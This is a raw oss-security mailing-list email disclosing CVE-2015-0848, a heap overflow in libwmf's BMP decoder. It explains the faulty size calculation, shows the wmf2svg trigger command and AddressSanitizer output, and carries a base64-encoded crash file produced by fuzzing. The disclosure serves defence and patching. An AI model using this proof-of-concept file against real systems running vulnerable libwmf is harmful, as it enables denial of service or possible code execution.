X-VM-v5-Data: ([nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
	["5124" "Monday" "1" "June" "2015" "03:06:57" "-0500" "=?UTF-8?B?RmVybmFuZG8gTXXDsW96?=" "fernando@null-life.com" "<CAEr-gPFc1eriF6FA4vHq2quDsLr6L2ZPEL6yPDjNazR84iNkCw@mail.gmail.com>" "113" "[oss-security] CVE-2015-0848 - Heap overflow on libwmf0.2-7" nil nil nil "6" "2015060108:06:57" "[oss-security] CVE-2015-0848 - Heap overflow on libwmf0.2-7" (number mark "        fernando@nul Jun  1  113/5124  " thread-indent "\"[oss-security] CVE-2015-0848 - Heap overflow on libwmf0.2-7\"\n") nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
	nil)
X-Mozilla-Status: 0001
X-Mozilla-Status2: 00000000
Received: (qmail 16120 invoked by uid 550); 1 Jun 2015 08:12:43 -0000
Mailing-List: contact oss-security-help@lists.openwall.com; run by ezmlm
Precedence: bulk
List-Post: <mailto:oss-security@lists.openwall.com>
List-Help: <mailto:oss-security-help@lists.openwall.com>
List-Unsubscribe: <mailto:oss-security-unsubscribe@lists.openwall.com>
List-Subscribe: <mailto:oss-security-subscribe@lists.openwall.com>
List-ID: <oss-security.lists.openwall.com>
Received: (qmail 13698 invoked from network); 1 Jun 2015 08:07:09 -0000
X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=1e100.net; s=20130820;
        h=x-gm-message-state:mime-version:date:message-id:subject:from:to
         :content-type;
        bh=txqt6EFGSsYgdx0cyhAVPJ/H0fkGIcxOMEbj0kKoPbs=;
        b=mqY9oeead8TnBqjx+u/IG6lO0kD+A11TSGfWyOrRsv/i6g5xfC6O6pOrnmWNG9gj2p
         ED+30YVw26tp7qIAAM+HRktVuYUzSlIf5yB0eD+Vk5yVit2701DhCajIPd8n2JIlLg8H
         VpwhI0F4WbNW2kWuKW94B4K9mejVS6tKhloXc00y7feKe/GSNkyTl1lMzMqnqAvQONe9
         37tv8HZjJwsJrjqNelbZOiiBod5TtW5uypS5SLD001OObnkRyT5kf5PQ3Wl7tkC/LeW8
         5sNYSpEiKPKDs1iXQtlkQH0ZKpKGQaCl7PoPLe/dc4ilu9aSzXjO13nybueC54aQGV8y
         rbIg==
X-Gm-Message-State: ALoCoQnnp43WO1o556Lw4Af5vbEs4gMDwGZ1gDF0sX402biP3dkXAHxGEnnWlFL1/SZFKCMjY+5s
MIME-Version: 1.0
X-Received: by 10.43.76.195 with SMTP id zf3mr27159596icb.62.1433146017725;
 Mon, 01 Jun 2015 01:06:57 -0700 (PDT)
X-Originating-IP: [181.50.56.230]
Message-ID: <CAEr-gPFc1eriF6FA4vHq2quDsLr6L2ZPEL6yPDjNazR84iNkCw@mail.gmail.com>
Content-Type: multipart/mixed; boundary=001a113321ee4c936a0517704f11
Date: Mon, 1 Jun 2015 03:06:57 -0500
From: =?UTF-8?Q?Fernando_Mu=C3=B1oz?= <fernando@null-life.com>
Reply-To: oss-security@lists.openwall.com
Subject: [oss-security] CVE-2015-0848 - Heap overflow on libwmf0.2-7
To: oss-security@lists.openwall.com

--001a113321ee4c936a0517704f11
Content-Type: text/plain; charset=UTF-8

libwmf is affected by a heap overflow on the function that decodes BMP images.

WMF files may contain both vector graphics and bitmap components. With
the attached WMF file, the issue can be reproduced, an overflow
happens because image_size gets a value of 32, that space is used to
allocate data->image

src/ipa/ipa/bmp.h, function ReadBMPImage:

1129    image_size = bytes_per_line * bmp->height;
1131    data->image = (unsigned char*) wmf_malloc (API,image_size);
1147        DecodeImage (API,bmp,src,(unsigned int)
bmp_info.compression,data->image);

Inside DecodeImage we have:

DecodeImage (wmfAPI* API,wmfBMP* bmp,BMPSource* src,unsigned int
compression,unsigned char* pixels)

874     for (u = 0; u < ((U32) bmp->width * (U32) bmp->height); u++)
pixels[u] = 0;

But bmp->width * bmp->height has a value of 64, and a write out of
bounds takes place.

$ wmf2svg --wmf-fontdir=/usr/share/fonts/type1/gsfonts bmpoverflow.wmf
<partial svg output>
*** Error in `wmf2svg': free(): invalid next size (fast): 0x091584b8 ***

ASAN enabled libwmf/wmf2svg shows the problem:

$ ./src/convert/wmf2svg --wmf-fontdir=/usr/share/fonts/type1/gsfonts
bmpoverflow.wmf
<partial svg output>
==3400==ERROR: AddressSanitizer: heap-buffer-overflow on address
0xb5c268b0 at pc 0x807093e bp 0xbfc3cee8 sp 0xbfc3ced8
WRITE of size 1 at 0xb5c268b0 thread T0
    #0 0x807093d in DecodeImage ../../src/ipa/ipa/bmp.h:874
    #1 0x807093d in ReadBMPImage ../../src/ipa/ipa/bmp.h:1147
    #2 0x807093d in wmf_ipa_bmp_read ../../src/ipa/ipa/bmp.h:477
    #3 0x815f013 in meta_dib_brush player/meta.h:2187
    #4 0x815f013 in WmfPlayMetaFile
/home/fmunozs/wmf/libwmf-0.2.8.4/src/player.c:922
    #5 0x81a5ff5 in wmf_play /home/fmunozs/wmf/libwmf-0.2.8.4/src/player.c:323
    #6 0x804c583 in wmf2svg_draw
/home/fmunozs/wmf/libwmf-0.2.8.4/src/convert/wmf2svg.c:208
    #7 0x804f2c5 in wmf2svg_file
/home/fmunozs/wmf/libwmf-0.2.8.4/src/convert/wmf2svg.c:439
    #8 0x804ad78 in main
/home/fmunozs/wmf/libwmf-0.2.8.4/src/convert/wmf2svg.c:458
    #9 0xb6efc72d in __libc_start_main (/lib/i386-linux-gnu/libc.so.6+0x1872d)
    #10 0x804b46e
(/home/fmunozs/wmf/libwmf-0.2.8.4/src/convert/wmf2svg+0x804b46e)

0xb5c268b0 is located 0 bytes to the right of 32-byte region
[0xb5c26890,0xb5c268b0)
allocated by thread T0 here:
    #0 0xb72d718c in __interceptor_malloc
(/usr/lib/i386-linux-gnu/libasan.so.1+0x5118c)
    #1 0x80d74a8 in wmf_malloc /home/fmunozs/wmf/libwmf-0.2.8.4/src/api.c:482

This causes a Denial of Service, or could cause code execution since
the DecodeImage writes the data of the run-length decoded image to
data->image.

The attached file was fuzzed with lcamtuf's afl fuzzer.

--001a113321ee4c936a0517704f11
Content-Type: application/x-gzip; name="bmpoverflow.wmf.gz"
Content-Disposition: attachment; filename="bmpoverflow.wmf.gz"
Content-Transfer-Encoding: base64
X-Attachment-Id: f_iadlzrbr0

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

--001a113321ee4c936a0517704f11--
